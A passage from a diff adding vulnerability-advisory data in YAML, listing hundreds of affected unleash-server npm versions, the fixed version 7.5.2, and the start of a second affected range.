+      - pkg:npm/unleash-server@4.15.0
+      - pkg:npm/unleash-server@4.15.1
+      - pkg:npm/unleash-server@4.15.2
+      - pkg:npm/unleash-server@4.15.3
+      - pkg:npm/unleash-server@4.15.4
+      - pkg:npm/unleash-server@4.15.5
+      - pkg:npm/unleash-server@4.16.0
+      - pkg:npm/unleash-server@4.16.1
+      - pkg:npm/unleash-server@4.16.2
+      - pkg:npm/unleash-server@4.16.3
+      - pkg:npm/unleash-server@4.16.4
+      - pkg:npm/unleash-server@4.17.0-beta.0
+      - pkg:npm/unleash-server@4.17.0-beta.1
+      - pkg:npm/unleash-server@4.17.0-beta.2
+      - pkg:npm/unleash-server@4.17.0-beta.3
+      - pkg:npm/unleash-server@4.17.0-beta.4
+      - pkg:npm/unleash-server@4.17.0-beta.5
+      - pkg:npm/unleash-server@4.17.0-beta.6
+      - pkg:npm/unleash-server@4.17.0-beta.7
+      - pkg:npm/unleash-server@4.17.0-beta.8
+      - pkg:npm/unleash-server@4.17.0-beta.9
+      - pkg:npm/unleash-server@4.17.0-beta.10
+      - pkg:npm/unleash-server@4.17.0-beta.11
+      - pkg:npm/unleash-server@4.17.0-beta.12
+      - pkg:npm/unleash-server@4.17.0-beta.13
+      - pkg:npm/unleash-server@4.17.0
+      - pkg:npm/unleash-server@4.17.1
+      - pkg:npm/unleash-server@4.17.2
+      - pkg:npm/unleash-server@4.17.3
+      - pkg:npm/unleash-server@4.18.0-beta.0
+      - pkg:npm/unleash-server@4.18.0-beta.1
+      - pkg:npm/unleash-server@4.18.0-beta.2
+      - pkg:npm/unleash-server@4.18.0-beta.3
+      - pkg:npm/unleash-server@4.18.0-beta.4
+      - pkg:npm/unleash-server@4.18.0-beta.5
+      - pkg:npm/unleash-server@4.18.0-beta.6
+      - pkg:npm/unleash-server@4.18.0-beta.7
+      - pkg:npm/unleash-server@4.18.0-beta.8
+      - pkg:npm/unleash-server@4.18.0-beta.9
+      - pkg:npm/unleash-server@4.18.0-beta.10
+      - pkg:npm/unleash-server@4.18.0-beta.11
+      - pkg:npm/unleash-server@4.18.0-beta.12
+      - pkg:npm/unleash-server@4.18.0-beta.13
+      - pkg:npm/unleash-server@4.18.0-beta.14
+      - pkg:npm/unleash-server@4.18.0
+      - pkg:npm/unleash-server@4.18.1
+      - pkg:npm/unleash-server@4.18.3
+      - pkg:npm/unleash-server@4.18.4
+      - pkg:npm/unleash-server@4.18.5
+      - pkg:npm/unleash-server@4.18.6
+      - pkg:npm/unleash-server@4.18.7
+      - pkg:npm/unleash-server@4.18.8
+      - pkg:npm/unleash-server@4.18.9
+      - pkg:npm/unleash-server@4.19.0-beta.0
+      - pkg:npm/unleash-server@4.19.0-beta.1
+      - pkg:npm/unleash-server@4.19.0-beta.2
+      - pkg:npm/unleash-server@4.19.0
+      - pkg:npm/unleash-server@4.19.1
+      - pkg:npm/unleash-server@4.19.2
+      - pkg:npm/unleash-server@4.19.3
+      - pkg:npm/unleash-server@4.19.4
+      - pkg:npm/unleash-server@4.19.5
+      - pkg:npm/unleash-server@4.20.0-beta.0
+      - pkg:npm/unleash-server@4.20.0-beta.1
+      - pkg:npm/unleash-server@4.20.0-beta.2
+      - pkg:npm/unleash-server@4.20.0-beta.3
+      - pkg:npm/unleash-server@4.20.0-beta.4
+      - pkg:npm/unleash-server@4.20.0-beta.5
+      - pkg:npm/unleash-server@4.20.0-beta.6
+      - pkg:npm/unleash-server@4.20.0
+      - pkg:npm/unleash-server@4.20.1-beta.0
+      - pkg:npm/unleash-server@4.20.1-beta.1
+      - pkg:npm/unleash-server@4.20.1
+      - pkg:npm/unleash-server@4.20.2-beta.0
+      - pkg:npm/unleash-server@4.20.2
+      - pkg:npm/unleash-server@4.20.3
+      - pkg:npm/unleash-server@4.20.4
+      - pkg:npm/unleash-server@4.20.5-beta.0
+      - pkg:npm/unleash-server@4.20.5
+      - pkg:npm/unleash-server@4.20.6
+      - pkg:npm/unleash-server@4.21.0-beta.0
+      - pkg:npm/unleash-server@4.21.0-beta.1
+      - pkg:npm/unleash-server@4.21.0-beta.2
+      - pkg:npm/unleash-server@4.21.0-beta.3
+      - pkg:npm/unleash-server@4.21.0-beta.4
+      - pkg:npm/unleash-server@4.21.0-beta.5
+      - pkg:npm/unleash-server@4.21.0-beta.6
+      - pkg:npm/unleash-server@4.21.0-beta.7
+      - pkg:npm/unleash-server@4.21.0-beta.8
+      - pkg:npm/unleash-server@4.21.0-beta.13
+      - pkg:npm/unleash-server@4.21.0-beta.14
+      - pkg:npm/unleash-server@4.21.0-beta.15
+      - pkg:npm/unleash-server@4.21.0-beta.16
+      - pkg:npm/unleash-server@4.21.0-beta.17
+      - pkg:npm/unleash-server@4.21.0-beta.18
+      - pkg:npm/unleash-server@4.21.0-beta.19
+      - pkg:npm/unleash-server@4.21.0-beta.20
+      - pkg:npm/unleash-server@4.21.0-beta.21
+      - pkg:npm/unleash-server@4.21.0-beta.22
+      - pkg:npm/unleash-server@4.21.0-beta.23
+      - pkg:npm/unleash-server@4.21.0-beta.24
+      - pkg:npm/unleash-server@4.21.0-beta.25
+      - pkg:npm/unleash-server@4.21.0-beta.26
+      - pkg:npm/unleash-server@4.21.0-beta.27
+      - pkg:npm/unleash-server@4.21.0-beta.28
+      - pkg:npm/unleash-server@4.21.0-beta.29
+      - pkg:npm/unleash-server@4.21.0-beta.30
+      - pkg:npm/unleash-server@4.21.0-beta.31
+      - pkg:npm/unleash-server@4.21.0-beta.32
+      - pkg:npm/unleash-server@4.21.0-beta.33
+      - pkg:npm/unleash-server@4.21.0-beta.34
+      - pkg:npm/unleash-server@4.21.0-beta.35
+      - pkg:npm/unleash-server@4.21.0-beta.36
+      - pkg:npm/unleash-server@4.21.0-beta.37
+      - pkg:npm/unleash-server@4.21.0-beta.38
+      - pkg:npm/unleash-server@4.21.0-beta.39
+      - pkg:npm/unleash-server@4.21.0-beta.40
+      - pkg:npm/unleash-server@4.21.0-beta.41
+      - pkg:npm/unleash-server@4.21.0-beta.42
+      - pkg:npm/unleash-server@4.21.0-beta.43
+      - pkg:npm/unleash-server@4.21.0-beta.44
+      - pkg:npm/unleash-server@4.21.0-beta.45
+      - pkg:npm/unleash-server@4.21.0-beta.46
+      - pkg:npm/unleash-server@4.21.0-beta.47
+      - pkg:npm/unleash-server@4.21.0-beta.48
+      - pkg:npm/unleash-server@4.21.0-beta.49
+      - pkg:npm/unleash-server@4.21.0-beta.50
+      - pkg:npm/unleash-server@4.21.0-beta.51
+      - pkg:npm/unleash-server@4.21.0-beta.52
+      - pkg:npm/unleash-server@4.21.0-beta.53
+      - pkg:npm/unleash-server@4.21.0-beta.54
+      - pkg:npm/unleash-server@4.21.0-beta.55
+      - pkg:npm/unleash-server@4.21.0-beta.56
+      - pkg:npm/unleash-server@4.21.0-beta.57
+      - pkg:npm/unleash-server@4.21.0
+      - pkg:npm/unleash-server@4.21.1-beta.0
+      - pkg:npm/unleash-server@4.21.1
+      - pkg:npm/unleash-server@4.21.2
+      - pkg:npm/unleash-server@4.21.3
+      - pkg:npm/unleash-server@4.22.0-beta.1
+      - pkg:npm/unleash-server@4.22.0-beta.2
+      - pkg:npm/unleash-server@4.22.0-beta.3
+      - pkg:npm/unleash-server@4.22.0-beta.4
+      - pkg:npm/unleash-server@4.22.0-beta.5
+      - pkg:npm/unleash-server@4.22.0-beta.6
+      - pkg:npm/unleash-server@4.22.0-beta.7
+      - pkg:npm/unleash-server@4.22.0-beta.8
+      - pkg:npm/unleash-server@4.22.0-beta.9
+      - pkg:npm/unleash-server@4.22.0-beta.10
+      - pkg:npm/unleash-server@4.22.0-beta.11
+      - pkg:npm/unleash-server@4.22.0-beta.12
+      - pkg:npm/unleash-server@4.22.0-beta.13
+      - pkg:npm/unleash-server@4.22.0-beta.14
+      - pkg:npm/unleash-server@4.22.0-beta.15
+      - pkg:npm/unleash-server@4.22.0-beta.16
+      - pkg:npm/unleash-server@4.22.0-beta.17
+      - pkg:npm/unleash-server@4.22.0-beta.18
+      - pkg:npm/unleash-server@4.22.0-beta.19
+      - pkg:npm/unleash-server@4.22.0-beta.20
+      - pkg:npm/unleash-server@4.22.0-beta.21
+      - pkg:npm/unleash-server@4.22.0-beta.22
+      - pkg:npm/unleash-server@4.22.0-beta.23
+      - pkg:npm/unleash-server@4.22.0-beta.24
+      - pkg:npm/unleash-server@4.22.0-beta.25
+      - pkg:npm/unleash-server@4.22.0-beta.26
+      - pkg:npm/unleash-server@4.22.0-beta.27
+      - pkg:npm/unleash-server@4.22.0-beta.28
+      - pkg:npm/unleash-server@4.22.0-beta.29
+      - pkg:npm/unleash-server@4.22.0-beta.30
+      - pkg:npm/unleash-server@4.22.0-beta.31
+      - pkg:npm/unleash-server@4.22.0-beta.32
+      - pkg:npm/unleash-server@4.22.0-beta.33
+      - pkg:npm/unleash-server@4.22.0-beta.34
+      - pkg:npm/unleash-server@4.22.0-beta.35
+      - pkg:npm/unleash-server@4.22.0-beta.36
+      - pkg:npm/unleash-server@4.22.0-beta.37
+      - pkg:npm/unleash-server@4.22.0-beta.38
+      - pkg:npm/unleash-server@4.22.0-beta.39
+      - pkg:npm/unleash-server@4.22.0-beta.40
+      - pkg:npm/unleash-server@4.22.0-beta.41
+      - pkg:npm/unleash-server@4.22.0-beta.42
+      - pkg:npm/unleash-server@4.22.0-beta.43
+      - pkg:npm/unleash-server@4.22.0-beta.44
+      - pkg:npm/unleash-server@4.22.0-beta.45
+      - pkg:npm/unleash-server@4.22.0-beta.46
+      - pkg:npm/unleash-server@4.22.0-beta.47
+      - pkg:npm/unleash-server@4.22.0-beta.48
+      - pkg:npm/unleash-server@4.22.0-beta.49
+      - pkg:npm/unleash-server@4.22.0-beta.50
+      - pkg:npm/unleash-server@4.22.0-beta.51
+      - pkg:npm/unleash-server@4.22.0-beta.52
+      - pkg:npm/unleash-server@4.22.0-beta.53
+      - pkg:npm/unleash-server@4.22.0-beta.54
+      - pkg:npm/unleash-server@4.22.0-beta.55
+      - pkg:npm/unleash-server@4.22.0-beta.56
+      - pkg:npm/unleash-server@4.22.0-beta.57
+      - pkg:npm/unleash-server@4.22.0-beta.58
+      - pkg:npm/unleash-server@4.22.0-beta.59
+      - pkg:npm/unleash-server@4.22.0-beta.60
+      - pkg:npm/unleash-server@4.22.0-beta.61
+      - pkg:npm/unleash-server@4.22.0-beta.62
+      - pkg:npm/unleash-server@4.22.0-beta.63
+      - pkg:npm/unleash-server@4.22.0-beta.64
+      - pkg:npm/unleash-server@4.22.0-beta.65
+      - pkg:npm/unleash-server@4.22.0-beta.66
+      - pkg:npm/unleash-server@4.22.0-beta.67
+      - pkg:npm/unleash-server@4.22.0-beta.68
+      - pkg:npm/unleash-server@4.22.0-beta.69
+      - pkg:npm/unleash-server@4.22.0-beta.70
+      - pkg:npm/unleash-server@4.22.0-beta.71
+      - pkg:npm/unleash-server@4.22.0-beta.72
+      - pkg:npm/unleash-server@4.22.0-beta.73
+      - pkg:npm/unleash-server@4.22.0-beta.74
+      - pkg:npm/unleash-server@4.22.0-beta.75
+      - pkg:npm/unleash-server@4.22.0-beta.76
+      - pkg:npm/unleash-server@4.22.0-beta.77
+      - pkg:npm/unleash-server@4.22.0-beta.78
+      - pkg:npm/unleash-server@4.22.0-beta.79
+      - pkg:npm/unleash-server@4.22.0-beta.80
+      - pkg:npm/unleash-server@4.22.0-beta.81
+      - pkg:npm/unleash-server@4.22.0-beta.82
+      - pkg:npm/unleash-server@4.22.0-beta.83
+      - pkg:npm/unleash-server@4.22.0-beta.84
+      - pkg:npm/unleash-server@4.22.0-beta.85
+      - pkg:npm/unleash-server@4.22.0-beta.86
+      - pkg:npm/unleash-server@4.22.0-beta.87
+      - pkg:npm/unleash-server@4.22.0-beta.88
+      - pkg:npm/unleash-server@4.22.0-beta.89
+      - pkg:npm/unleash-server@4.22.0-beta.90
+      - pkg:npm/unleash-server@4.22.0-beta.91
+      - pkg:npm/unleash-server@4.22.0-beta.92
+      - pkg:npm/unleash-server@4.22.0-beta.93
+      - pkg:npm/unleash-server@4.22.0-beta.94
+      - pkg:npm/unleash-server@4.22.0-beta.95
+      - pkg:npm/unleash-server@4.22.0-beta.96
+      - pkg:npm/unleash-server@4.22.0-beta.97
+      - pkg:npm/unleash-server@4.22.0-beta.98
+      - pkg:npm/unleash-server@4.22.0-beta.99
+      - pkg:npm/unleash-server@4.22.0-beta.100
+      - pkg:npm/unleash-server@4.22.0-beta.101
+      - pkg:npm/unleash-server@4.22.0-beta.102
+      - pkg:npm/unleash-server@4.22.0-beta.103
+      - pkg:npm/unleash-server@4.22.0-beta.104
+      - pkg:npm/unleash-server@4.22.0-beta.105
+      - pkg:npm/unleash-server@4.22.0-beta.106
+      - pkg:npm/unleash-server@4.22.0-beta.107
+      - pkg:npm/unleash-server@4.22.0-beta.108
+      - pkg:npm/unleash-server@4.22.0-beta.109
+      - pkg:npm/unleash-server@4.22.0-beta.110
+      - pkg:npm/unleash-server@4.22.0-beta.111
+      - pkg:npm/unleash-server@4.22.0-beta.112
+      - pkg:npm/unleash-server@4.22.0-beta.113
+      - pkg:npm/unleash-server@4.22.0-beta.114
+      - pkg:npm/unleash-server@4.22.0-beta.115
+      - pkg:npm/unleash-server@4.22.0-beta.116
+      - pkg:npm/unleash-server@4.22.0-beta.117
+      - pkg:npm/unleash-server@4.22.0-beta.118
+      - pkg:npm/unleash-server@4.22.0-beta.119
+      - pkg:npm/unleash-server@4.22.0-beta.120
+      - pkg:npm/unleash-server@4.22.0-beta.121
+      - pkg:npm/unleash-server@4.22.0-beta.122
+      - pkg:npm/unleash-server@4.22.0-beta.123
+      - pkg:npm/unleash-server@4.22.0-beta.124
+      - pkg:npm/unleash-server@4.22.0-beta.125
+      - pkg:npm/unleash-server@4.22.0-beta.126
+      - pkg:npm/unleash-server@4.22.0-beta.127
+      - pkg:npm/unleash-server@4.22.0-beta.128
+      - pkg:npm/unleash-server@4.22.0-beta.129
+      - pkg:npm/unleash-server@4.22.0-beta.130
+      - pkg:npm/unleash-server@4.22.0-beta.131
+      - pkg:npm/unleash-server@4.22.0-beta.132
+      - pkg:npm/unleash-server@4.22.0-beta.133
+      - pkg:npm/unleash-server@4.22.0-beta.134
+      - pkg:npm/unleash-server@4.22.0-beta.135
+      - pkg:npm/unleash-server@4.22.0-beta.136
+      - pkg:npm/unleash-server@4.22.0-beta.137
+      - pkg:npm/unleash-server@4.22.0-beta.138
+      - pkg:npm/unleash-server@4.22.0-beta.139
+      - pkg:npm/unleash-server@4.22.0-beta.140
+      - pkg:npm/unleash-server@4.22.0-beta.141
+      - pkg:npm/unleash-server@4.22.0
+      - pkg:npm/unleash-server@4.22.1
+      - pkg:npm/unleash-server@4.22.2
+      - pkg:npm/unleash-server@4.22.3
+      - pkg:npm/unleash-server@4.22.5
+      - pkg:npm/unleash-server@4.22.6
+      - pkg:npm/unleash-server@4.22.7
+      - pkg:npm/unleash-server@4.22.8
+      - pkg:npm/unleash-server@4.22.9
+      - pkg:npm/unleash-server@4.23.0-beta.0
+      - pkg:npm/unleash-server@4.23.0-beta.1
+      - pkg:npm/unleash-server@4.23.0-beta.2
+      - pkg:npm/unleash-server@4.23.0-beta.3
+      - pkg:npm/unleash-server@4.23.0-beta.4
+      - pkg:npm/unleash-server@4.23.0-beta.5
+      - pkg:npm/unleash-server@4.23.0-beta.6
+      - pkg:npm/unleash-server@4.23.0-beta.7
+      - pkg:npm/unleash-server@4.23.0-beta.8
+      - pkg:npm/unleash-server@4.23.0-beta.9
+      - pkg:npm/unleash-server@4.23.0-beta.10
+      - pkg:npm/unleash-server@4.23.0-beta.11
+      - pkg:npm/unleash-server@4.23.0-beta.12
+      - pkg:npm/unleash-server@4.23.0-beta.13
+      - pkg:npm/unleash-server@4.23.0-beta.14
+      - pkg:npm/unleash-server@4.23.0-beta.15
+      - pkg:npm/unleash-server@4.23.0-beta.16
+      - pkg:npm/unleash-server@4.23.0-beta.17
+      - pkg:npm/unleash-server@4.23.0-beta.18
+      - pkg:npm/unleash-server@4.23.0-beta.19
+      - pkg:npm/unleash-server@4.23.0-beta.20
+      - pkg:npm/unleash-server@4.23.0-beta.21
+      - pkg:npm/unleash-server@4.23.0-beta.22
+      - pkg:npm/unleash-server@4.23.0-beta.23
+      - pkg:npm/unleash-server@4.23.0-beta.24
+      - pkg:npm/unleash-server@4.23.0-beta.25
+      - pkg:npm/unleash-server@4.23.0-beta.26
+      - pkg:npm/unleash-server@4.23.0-beta.27
+      - pkg:npm/unleash-server@4.23.0-beta.28
+      - pkg:npm/unleash-server@4.23.0-beta.29
+      - pkg:npm/unleash-server@4.23.0-beta.30
+      - pkg:npm/unleash-server@4.23.0-beta.31
+      - pkg:npm/unleash-server@4.23.0-beta.32
+      - pkg:npm/unleash-server@4.23.0-beta.33
+      - pkg:npm/unleash-server@4.23.0-beta.34
+      - pkg:npm/unleash-server@4.23.0-beta.35
+      - pkg:npm/unleash-server@4.23.0-beta.36
+      - pkg:npm/unleash-server@4.23.0-beta.37
+      - pkg:npm/unleash-server@4.23.0-beta.38
+      - pkg:npm/unleash-server@4.23.0-beta.39
+      - pkg:npm/unleash-server@4.23.0-beta.40
+      - pkg:npm/unleash-server@4.23.0-beta.41
+      - pkg:npm/unleash-server@4.23.0-beta.42
+      - pkg:npm/unleash-server@4.23.0-beta.43
+      - pkg:npm/unleash-server@4.23.0-beta.44
+      - pkg:npm/unleash-server@4.23.0-beta.45
+      - pkg:npm/unleash-server@4.23.0-beta.46
+      - pkg:npm/unleash-server@4.23.0-beta.47
+      - pkg:npm/unleash-server@4.23.0-beta.48
+      - pkg:npm/unleash-server@4.23.0-beta.49
+      - pkg:npm/unleash-server@4.23.0-beta.50
+      - pkg:npm/unleash-server@4.23.0-beta.51
+      - pkg:npm/unleash-server@4.23.0-beta.52
+      - pkg:npm/unleash-server@4.23.0-beta.53
+      - pkg:npm/unleash-server@4.23.0-beta.54
+      - pkg:npm/unleash-server@4.23.0-beta.55
+      - pkg:npm/unleash-server@4.23.0-beta.56
+      - pkg:npm/unleash-server@4.23.0-beta.57
+      - pkg:npm/unleash-server@4.23.0-beta.58
+      - pkg:npm/unleash-server@4.23.0-beta.59
+      - pkg:npm/unleash-server@4.23.0-beta.60
+      - pkg:npm/unleash-server@4.23.0-beta.61
+      - pkg:npm/unleash-server@4.23.0-beta.62
+      - pkg:npm/unleash-server@4.23.0-beta.63
+      - pkg:npm/unleash-server@4.23.0-beta.64
+      - pkg:npm/unleash-server@4.23.0-beta.65
+      - pkg:npm/unleash-server@4.23.0-beta.66
+      - pkg:npm/unleash-server@4.23.0-beta.67
+      - pkg:npm/unleash-server@4.23.0-beta.68
+      - pkg:npm/unleash-server@4.23.0-beta.69
+      - pkg:npm/unleash-server@4.23.0-beta.70
+      - pkg:npm/unleash-server@4.23.0-beta.71
+      - pkg:npm/unleash-server@4.23.0-beta.72
+      - pkg:npm/unleash-server@4.23.0-beta.73
+      - pkg:npm/unleash-server@4.23.0-beta.74
+      - pkg:npm/unleash-server@4.23.0-beta.75
+      - pkg:npm/unleash-server@4.23.0-beta.76
+      - pkg:npm/unleash-server@4.23.0-beta.77
+      - pkg:npm/unleash-server@4.23.0-beta.78
+      - pkg:npm/unleash-server@4.23.0-beta.79
+      - pkg:npm/unleash-server@4.23.0-beta.80
+      - pkg:npm/unleash-server@4.23.0-beta.81
+      - pkg:npm/unleash-server@4.23.0-beta.82
+      - pkg:npm/unleash-server@4.23.0-beta.83
+      - pkg:npm/unleash-server@4.23.0-beta.84
+      - pkg:npm/unleash-server@4.23.1
+      - pkg:npm/unleash-server@4.23.2
+      - pkg:npm/unleash-server@4.23.3
+      - pkg:npm/unleash-server@4.23.4
+      - pkg:npm/unleash-server@5.0.0-beta.0
+      - pkg:npm/unleash-server@5.0.0-beta.1
+      - pkg:npm/unleash-server@5.0.0-beta.2
+      - pkg:npm/unleash-server@5.0.0
+      - pkg:npm/unleash-server@5.0.1
+      - pkg:npm/unleash-server@5.0.2
+      - pkg:npm/unleash-server@5.0.4
+      - pkg:npm/unleash-server@5.0.5
+      - pkg:npm/unleash-server@5.0.6
+      - pkg:npm/unleash-server@5.0.7
+      - pkg:npm/unleash-server@5.0.8
+      - pkg:npm/unleash-server@5.0.9
+      - pkg:npm/unleash-server@5.0.10
+      - pkg:npm/unleash-server@5.0.11
+      - pkg:npm/unleash-server@5.1.0-beta.0
+      - pkg:npm/unleash-server@5.1.0-beta.1
+      - pkg:npm/unleash-server@5.1.0-beta.2
+      - pkg:npm/unleash-server@5.1.0-beta.3
+      - pkg:npm/unleash-server@5.1.0-beta.4
+      - pkg:npm/unleash-server@5.1.0-beta.5
+      - pkg:npm/unleash-server@5.1.0-beta.6
+      - pkg:npm/unleash-server@5.1.0-beta.7
+      - pkg:npm/unleash-server@5.1.0-beta.8
+      - pkg:npm/unleash-server@5.1.0-beta.9
+      - pkg:npm/unleash-server@5.1.0-beta.10
+      - pkg:npm/unleash-server@5.1.0-beta.11
+      - pkg:npm/unleash-server@5.1.0-beta.12
+      - pkg:npm/unleash-server@5.1.0-beta.13
+      - pkg:npm/unleash-server@5.1.0-beta.14
+      - pkg:npm/unleash-server@5.1.0-beta.15
+      - pkg:npm/unleash-server@5.1.0-beta.16
+      - pkg:npm/unleash-server@5.1.0-beta.17
+      - pkg:npm/unleash-server@5.1.0-beta.18
+      - pkg:npm/unleash-server@5.1.0-beta.19
+      - pkg:npm/unleash-server@5.1.0-beta.20
+      - pkg:npm/unleash-server@5.1.0-beta.21
+      - pkg:npm/unleash-server@5.1.0-beta.22
+      - pkg:npm/unleash-server@5.1.0-beta.23
+      - pkg:npm/unleash-server@5.1.0-beta.24
+      - pkg:npm/unleash-server@5.1.0-beta.25
+      - pkg:npm/unleash-server@5.1.0-beta.26
+      - pkg:npm/unleash-server@5.1.0-beta.27
+      - pkg:npm/unleash-server@5.1.0-beta.28
+      - pkg:npm/unleash-server@5.1.0-beta.29
+      - pkg:npm/unleash-server@5.1.0-beta.30
+      - pkg:npm/unleash-server@5.1.0-beta.31
+      - pkg:npm/unleash-server@5.1.0-beta.33
+      - pkg:npm/unleash-server@5.1.0-beta.34
+      - pkg:npm/unleash-server@5.1.0-beta.35
+      - pkg:npm/unleash-server@5.1.0-beta.36
+      - pkg:npm/unleash-server@5.1.0-beta.37
+      - pkg:npm/unleash-server@5.1.0-beta.38
+      - pkg:npm/unleash-server@5.1.0-beta.39
+      - pkg:npm/unleash-server@5.1.0-beta.40
+      - pkg:npm/unleash-server@5.1.0-beta.41
+      - pkg:npm/unleash-server@5.1.0-beta.42
+      - pkg:npm/unleash-server@5.1.0-beta.43
+      - pkg:npm/unleash-server@5.1.0-beta.44
+      - pkg:npm/unleash-server@5.1.0-beta.45
+      - pkg:npm/unleash-server@5.1.0-beta.46
+      - pkg:npm/unleash-server@5.1.0-beta.47
+      - pkg:npm/unleash-server@5.1.0-beta.48
+      - pkg:npm/unleash-server@5.1.0-beta.49
+      - pkg:npm/unleash-server@5.1.0-beta.50
+      - pkg:npm/unleash-server@5.1.0-beta.51
+      - pkg:npm/unleash-server@5.1.0-beta.52
+      - pkg:npm/unleash-server@5.1.0-beta.53
+      - pkg:npm/unleash-server@5.1.0-beta.54
+      - pkg:npm/unleash-server@5.1.0-rc.test.0
+      - pkg:npm/unleash-server@5.1.0
+      - pkg:npm/unleash-server@5.1.1
+      - pkg:npm/unleash-server@5.1.2
+      - pkg:npm/unleash-server@5.1.3
+      - pkg:npm/unleash-server@5.1.4
+      - pkg:npm/unleash-server@5.1.5
+      - pkg:npm/unleash-server@5.1.6
+      - pkg:npm/unleash-server@5.1.7
+      - pkg:npm/unleash-server@5.1.8
+      - pkg:npm/unleash-server@5.1.9
+      - pkg:npm/unleash-server@5.2.0
+      - pkg:npm/unleash-server@5.2.2
+      - pkg:npm/unleash-server@5.2.3
+      - pkg:npm/unleash-server@5.2.4
+      - pkg:npm/unleash-server@5.2.5
+      - pkg:npm/unleash-server@5.2.6
+      - pkg:npm/unleash-server@5.2.7
+      - pkg:npm/unleash-server@5.2.8
+      - pkg:npm/unleash-server@5.2.9
+      - pkg:npm/unleash-server@5.3.0
+      - pkg:npm/unleash-server@5.3.1
+      - pkg:npm/unleash-server@5.3.2
+      - pkg:npm/unleash-server@5.3.3
+      - pkg:npm/unleash-server@5.3.4
+      - pkg:npm/unleash-server@5.3.5
+      - pkg:npm/unleash-server@5.4.0
+      - pkg:npm/unleash-server@5.4.1
+      - pkg:npm/unleash-server@5.4.2
+      - pkg:npm/unleash-server@5.4.3
+      - pkg:npm/unleash-server@5.4.4
+      - pkg:npm/unleash-server@5.5.0
+      - pkg:npm/unleash-server@5.5.1
+      - pkg:npm/unleash-server@5.5.2
+      - pkg:npm/unleash-server@5.5.3
+      - pkg:npm/unleash-server@5.5.4
+      - pkg:npm/unleash-server@5.5.5
+      - pkg:npm/unleash-server@5.5.6
+      - pkg:npm/unleash-server@5.5.7
+      - pkg:npm/unleash-server@5.6.0
+      - pkg:npm/unleash-server@5.6.1
+      - pkg:npm/unleash-server@5.6.2
+      - pkg:npm/unleash-server@5.6.3
+      - pkg:npm/unleash-server@5.6.4
+      - pkg:npm/unleash-server@5.6.5
+      - pkg:npm/unleash-server@5.6.6
+      - pkg:npm/unleash-server@5.6.7
+      - pkg:npm/unleash-server@5.6.8
+      - pkg:npm/unleash-server@5.6.9
+      - pkg:npm/unleash-server@5.6.10
+      - pkg:npm/unleash-server@5.7.0
+      - pkg:npm/unleash-server@5.7.1
+      - pkg:npm/unleash-server@5.7.2
+      - pkg:npm/unleash-server@5.7.3
+      - pkg:npm/unleash-server@5.8.0
+      - pkg:npm/unleash-server@5.8.1
+      - pkg:npm/unleash-server@5.8.2
+      - pkg:npm/unleash-server@5.9.0
+      - pkg:npm/unleash-server@5.9.1
+      - pkg:npm/unleash-server@5.9.2
+      - pkg:npm/unleash-server@5.9.3
+      - pkg:npm/unleash-server@5.9.4
+      - pkg:npm/unleash-server@5.9.5
+      - pkg:npm/unleash-server@5.9.6
+      - pkg:npm/unleash-server@5.10.0
+      - pkg:npm/unleash-server@5.10.1
+      - pkg:npm/unleash-server@5.10.2
+      - pkg:npm/unleash-server@5.11.0
+      - pkg:npm/unleash-server@5.11.1
+      - pkg:npm/unleash-server@5.11.2
+      - pkg:npm/unleash-server@5.11.3
+      - pkg:npm/unleash-server@5.12.0
+      - pkg:npm/unleash-server@5.12.1
+      - pkg:npm/unleash-server@5.12.2
+      - pkg:npm/unleash-server@5.12.3
+      - pkg:npm/unleash-server@5.12.4
+      - pkg:npm/unleash-server@5.12.5
+      - pkg:npm/unleash-server@5.12.7
+      - pkg:npm/unleash-server@5.12.8
+      - pkg:npm/unleash-server@6.0.0
+      - pkg:npm/unleash-server@6.0.1
+      - pkg:npm/unleash-server@6.0.2
+      - pkg:npm/unleash-server@6.0.3
+      - pkg:npm/unleash-server@6.0.4
+      - pkg:npm/unleash-server@6.0.5
+      - pkg:npm/unleash-server@6.0.6
+      - pkg:npm/unleash-server@6.0.7
+      - pkg:npm/unleash-server@6.1.0
+      - pkg:npm/unleash-server@6.1.2
+      - pkg:npm/unleash-server@6.1.3
+      - pkg:npm/unleash-server@6.1.4
+      - pkg:npm/unleash-server@6.1.5
+      - pkg:npm/unleash-server@6.1.6
+      - pkg:npm/unleash-server@6.1.7
+      - pkg:npm/unleash-server@6.1.8
+      - pkg:npm/unleash-server@6.1.9
+      - pkg:npm/unleash-server@6.1.10
+      - pkg:npm/unleash-server@6.1.11
+      - pkg:npm/unleash-server@6.1.12
+      - pkg:npm/unleash-server@6.2.0
+      - pkg:npm/unleash-server@6.2.1
+      - pkg:npm/unleash-server@6.2.2
+      - pkg:npm/unleash-server@6.2.3
+      - pkg:npm/unleash-server@6.2.4
+      - pkg:npm/unleash-server@6.3.0
+      - pkg:npm/unleash-server@6.4.0
+      - pkg:npm/unleash-server@6.4.1
+      - pkg:npm/unleash-server@6.5.0
+      - pkg:npm/unleash-server@6.5.1
+      - pkg:npm/unleash-server@6.5.2
+      - pkg:npm/unleash-server@6.5.3
+      - pkg:npm/unleash-server@6.6.0
+      - pkg:npm/unleash-server@6.7.0
+      - pkg:npm/unleash-server@6.7.1
+      - pkg:npm/unleash-server@6.7.2
+      - pkg:npm/unleash-server@6.8.0
+      - pkg:npm/unleash-server@6.9.0
+      - pkg:npm/unleash-server@6.9.1
+      - pkg:npm/unleash-server@6.9.2
+      - pkg:npm/unleash-server@6.10.0
+      - pkg:npm/unleash-server@6.10.1
+      - pkg:npm/unleash-server@7.0.0
+      - pkg:npm/unleash-server@7.0.1
+      - pkg:npm/unleash-server@7.0.2
+      - pkg:npm/unleash-server@7.0.3
+      - pkg:npm/unleash-server@7.0.4
+      - pkg:npm/unleash-server@7.0.5
+      - pkg:npm/unleash-server@7.0.6
+      - pkg:npm/unleash-server@7.1.0
+      - pkg:npm/unleash-server@7.1.1
+      - pkg:npm/unleash-server@7.1.2
+      - pkg:npm/unleash-server@7.2.0
+      - pkg:npm/unleash-server@7.2.1
+      - pkg:npm/unleash-server@7.2.2
+      - pkg:npm/unleash-server@7.2.3
+      - pkg:npm/unleash-server@7.3.0
+      - pkg:npm/unleash-server@7.4.0
+      - pkg:npm/unleash-server@7.4.1
+      - pkg:npm/unleash-server@7.4.2
+      - pkg:npm/unleash-server@7.4.3
+      - pkg:npm/unleash-server@7.5.0
+      - pkg:npm/unleash-server@7.5.1
+    fixed_packages:
+      - pkg:npm/unleash-server@7.5.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/unleash-server
+    affected_versions: vers:npm/>=7.6.0|<7.6.5
+    fixed_versions: vers:npm/7.6.5
+    affected_packages:
